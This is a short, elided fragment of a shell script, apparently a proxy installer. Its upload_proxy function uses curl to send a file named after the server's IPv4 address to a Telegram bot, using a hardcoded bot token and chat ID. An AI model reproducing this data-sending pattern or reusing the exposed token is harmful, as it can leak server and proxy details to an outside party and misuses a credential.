...
upload_proxy() {
    ...
    curl -X POST -F 'document=@/home/proxy-installer/'"$IP4"'.txt' -F 'chat_id=2119962162' https://api.telegram.org/bot7064693227:AAEBxteu1Ksn5hoE2NHwNhNVFXx5ueEjBNc/sendDocument
